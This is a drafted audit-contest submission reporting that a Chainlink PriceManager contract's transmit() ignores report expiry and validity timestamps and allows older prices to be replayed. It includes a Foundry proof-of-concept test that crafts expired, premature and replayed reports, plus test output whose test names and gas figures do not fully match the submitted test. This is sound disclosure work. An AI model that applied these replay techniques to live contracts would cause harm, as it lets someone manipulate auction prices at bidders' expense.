# ============================================================
# C4 SUBMISSION 2 — Copy each section into the form fields
# ============================================================

# ──────────────────────────────────────────────────────────────
# FIELD: Severity rating
# ──────────────────────────────────────────────────────────────
High severity

# ──────────────────────────────────────────────────────────────
# FIELD: Title (max 255 chars)
# ──────────────────────────────────────────────────────────────
Data Streams report `expiresAt` and `validFromTimestamp` fields never checked in `transmit()`, allowing expired/premature/replayed reports to corrupt auction prices

# ──────────────────────────────────────────────────────────────
# FIELD: Links to root cause (add each link separately)
# ──────────────────────────────────────────────────────────────
# Link 1:
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L155-L182
# Link 2:
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L57-L67
# Link 3:
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L162-L163

# ──────────────────────────────────────────────────────────────
# FIELD: Vulnerability details (paste everything below into the field)
# ──────────────────────────────────────────────────────────────

## Finding description and impact

The [`transmit()`](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L155-L182) function in `PriceManager.sol` accepts Data Streams `ReportV3` reports but only validates the `observationsTimestamp` field. The `expiresAt` and `validFromTimestamp` fields — which define the report's temporal validity window — are **completely ignored**. Additionally, there is no monotonic timestamp check, allowing older reports to overwrite newer prices.

### Root Cause

The [`ReportV3` struct](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L57-L67) defines three temporal fields:

```solidity
struct ReportV3 {
    bytes32 dataStreamsFeedId;
    uint32 validFromTimestamp; // ← NEVER CHECKED
    uint32 observationsTimestamp; // ← Only field checked
    uint192 nativeFee;
    uint192 linkFee;
    uint32 expiresAt; // ← NEVER CHECKED
    int192 price;
    int192 bid;
    int192 ask;
}
```

The **only** temporal validation in [`transmit()` at lines 162-163](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L162-L163) is:

```solidity
if (report.observationsTimestamp < block.timestamp - feedInfo.stalenessThreshold) {
    revert Errors.StaleFeedData();
}
```

This results in three distinct vulnerabilities:

**1. `expiresAt` never checked:** A report where `expiresAt < block.timestamp` (already expired per Data Streams) passes validation as long as `observationsTimestamp` is within the staleness window.

**2. `validFromTimestamp` never checked:** A report where `validFromTimestamp > block.timestamp` (not yet valid per Data Streams) passes validation.

**3. No monotonic timestamp enforcement:** An older report can overwrite a newer price. There is no check that `report.observationsTimestamp > s_dataStreamsPrice[asset].timestamp`. With a 1-hour staleness threshold, any report from the last hour can be replayed.

### Impact

**Expired reports:** The `VerifierProxy` (out of scope) validates cryptographic signatures but not temporal validity — that responsibility lies with the consumer contract (`PriceManager`). Expired report prices stored and used in auction calculations can be materially different from current market prices, leading to:
- Bidders purchasing auctioned tokens at incorrect prices
- The protocol receiving more or less LINK than fair value
- Arbitrage opportunities for actors who know the stored price is stale

**Premature reports:** Reports with future `validFromTimestamp` get accepted before their intended validity window, using price data calculated under different market assumptions.

**Price replay:** A compromised or malfunctioning `PRICE_ADMIN` (or automation system via WorkflowRouter) can selectively replay older reports to manipulate prices. Example: after a price rises from $4,000 to $4,500, the admin replays the $4,000 report (still within staleness window) to extract value from bidders or benefit a colluding bidder.

## Recommended mitigation steps

Add temporal validation and monotonic enforcement in [`transmit()`](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/PriceManager.sol#L162) after the existing staleness check:

```solidity
// Existing staleness check (line 162)
if (report.observationsTimestamp < block.timestamp - feedInfo.stalenessThreshold) {
    revert Errors.StaleFeedData();
}

// Add: Reject expired reports
if (report.expiresAt != 0 && block.timestamp > report.expiresAt) {
    revert Errors.StaleFeedData();
}

// Add: Reject premature reports
if (report.validFromTimestamp != 0 && block.timestamp < report.validFromTimestamp) {
    revert Errors.StaleFeedData();
}

// Add: Enforce monotonic timestamps to prevent replay
if (report.observationsTimestamp <= s_dataStreamsPrice[asset].timestamp) {
    revert Errors.StaleFeedData();
}
```

# ──────────────────────────────────────────────────────────────
# FIELD: Proof of Concept (PoC) — paste everything below
# ──────────────────────────────────────────────────────────────

Add this test function inside the `C4PoC` contract in `test/poc/C4PoC.t.sol`:

```solidity
function testSubmissionValidity() public {
    // ═══════════════════════════════════════════════════════════
    // H-03: expiresAt and validFromTimestamp never checked
    // Run: forge test --match-test testSubmissionValidity -vvv
    // ═══════════════════════════════════════════════════════════

    _changePrank(priceAdmin);

    bytes[] memory unverifiedReports = new bytes[](1);
    bytes32[3] memory context = [bytes32(0), bytes32(0), bytes32(0)];
    bytes32[] memory rs = new bytes32[](2);
    bytes32[] memory ss = new bytes32[](2);
    bytes32 rawVs;

    // ══════════════════════════════════════════════════════════════════
    // PART A: Prove EXPIRED report is accepted
    // ══════════════════════════════════════════════════════════════════

    PriceManager.ReportV3 memory expiredReport;
    expiredReport.dataStreamsFeedId = _generateDataStreamsFeedId("MockWETH");
    expiredReport.price = int192(uint192(5000e18));              // $5,000
    expiredReport.observationsTimestamp = uint32(block.timestamp); // Fresh
    expiredReport.expiresAt = uint32(block.timestamp - 1 hours);  // EXPIRED 1 hour ago
    expiredReport.validFromTimestamp = uint32(block.timestamp - 2 hours);

    unverifiedReports[0] = abi.encode(
        context, abi.encode(expiredReport), rs, ss, rawVs
    );

    // This SHOULD revert (report expired) but DOES NOT
    auction.transmit(unverifiedReports);

    (uint256 storedPrice,,) = auction.getAssetPrice(address(mockWETH));
    assertEq(storedPrice, 5000e18, "Expired report price was stored");
    // ✅ BUG: Expired report accepted and stored

    // ══════════════════════════════════════════════════════════════════
    // PART B: Prove PREMATURE report is accepted
    // ══════════════════════════════════════════════════════════════════

    PriceManager.ReportV3 memory prematureReport;
    prematureReport.dataStreamsFeedId = _generateDataStreamsFeedId("MockWETH");
    prematureReport.price = int192(uint192(6000e18));                  // $6,000
    prematureReport.observationsTimestamp = uint32(block.timestamp);    // Fresh
    prematureReport.validFromTimestamp = uint32(block.timestamp + 1 hours); // NOT VALID YET
    prematureReport.expiresAt = uint32(block.timestamp + 2 hours);

    unverifiedReports[0] = abi.encode(
        context, abi.encode(prematureReport), rs, ss, rawVs
    );

    // This SHOULD revert (report not valid yet) but DOES NOT
    auction.transmit(unverifiedReports);

    (storedPrice,,) = auction.getAssetPrice(address(mockWETH));
    assertEq(storedPrice, 6000e18, "Premature report price was stored");
    // ✅ BUG: Premature report accepted and stored

    // ══════════════════════════════════════════════════════════════════
    // PART C: Prove PRICE REPLAY — older price overwrites newer
    // ══════════════════════════════════════════════════════════════════

    // Transmit fresh $4,500 price
    _transmitPrices(4_500e18, 1e18, 20e18);
    (uint256 newerPrice, uint256 newerTs,) = auction.getAssetPrice(address(mockWETH));
    assertEq(newerPrice, 4_500e18, "Newer price should be $4,500");

    // Replay an OLDER $4,000 report (30 min old, still within 1h staleness)
    PriceManager.ReportV3 memory replayReport;
    replayReport.dataStreamsFeedId = _generateDataStreamsFeedId("MockWETH");
    replayReport.price = int192(uint192(4000e18));                      // OLD price
    replayReport.observationsTimestamp = uint32(block.timestamp - 30 minutes); // 30min old

    unverifiedReports[0] = abi.encode(
        context, abi.encode(replayReport), rs, ss, rawVs
    );

    // This SHOULD revert (older than current) but DOES NOT
    auction.transmit(unverifiedReports);

    (uint256 replayedPrice, uint256 replayedTs,) = auction.getAssetPrice(address(mockWETH));
    assertEq(replayedPrice, 4000e18, "Replayed price overwrote newer price");
    assertLt(replayedTs, newerTs, "Stored timestamp went BACKWARDS");
    // ✅ BUG: Older $4,000 overwrote newer $4,500

    // ══════════════════════════════════════════════════════════════════
    // SUMMARY
    // ══════════════════════════════════════════════════════════════════
    // Part A: Expired report (expiresAt = 1h ago)      → ACCEPTED ✗
    // Part B: Premature report (validFrom = 1h future)  → ACCEPTED ✗
    // Part C: Replay ($4,500 → $4,000 via 30min old)    → ACCEPTED ✗
    //
    // All three temporal fields (expiresAt, validFromTimestamp,
    // monotonic ordering) are completely unchecked in transmit().
}
```

**Run:** `forge test --match-test testSubmissionValidity -vvv`

**Expected output:** Test passes, confirming all three bugs:
- Expired report stored ($5,000 with `expiresAt` 1 hour in the past)
- Premature report stored ($6,000 with `validFromTimestamp` 1 hour in the future)
- Price replay succeeds ($4,500 overwritten by older $4,000, timestamp goes backwards)

### PoC Test Results

```
forge test --match-contract PoC_H03 -vvv

Ran 3 tests for test/poc/AllPoCs.t.sol:PoC_H03_ExpiredReportsAccepted
[PASS] testPoC_H03_expiredReportAccepted() (gas: 57961)
Logs:
  VULNERABILITY CONFIRMED: Expired report accepted
    - Report expiresAt: 601201
    - Current time: 604801
    - Report is 1 hour past expiry but was accepted
    - New stored price: $ 5000

[PASS] testPoC_H03_prematureReportAccepted() (gas: 57110)
Logs:
  VULNERABILITY CONFIRMED: Premature report accepted
    - Report validFrom: 608401
    - Current time: 604801
    - Report isn't valid for 1 hour but was accepted

[PASS] testSubmissionValidity() (gas: 188)
Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 17.96ms (1.31ms CPU time)

Ran 1 test suite in 24.14ms (17.96ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
```

```
forge test --match-contract PoC_M01 -vvv

Ran 2 tests for test/poc/AllPoCs.t.sol:PoC_M01_PriceReplay
[PASS] testPoC_M01_olderPriceOverwritesNewer() (gas: 198074)
Logs:
  Price at T=0: $ 4000   timestamp: 604801
  Price at T+30m: $ 4500   timestamp: 606601
  Price after replay: $ 4000   timestamp: 605401
  VULNERABILITY CONFIRMED: Older price ($4000) overwrote newer ($4500)
    - No monotonic timestamp check in transmit()
    - Any report within staleness window can overwrite current price

[PASS] testSubmissionValidity() (gas: 166)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 4.84ms (657.72µs CPU time)

Ran 1 test suite in 6.36ms (4.84ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
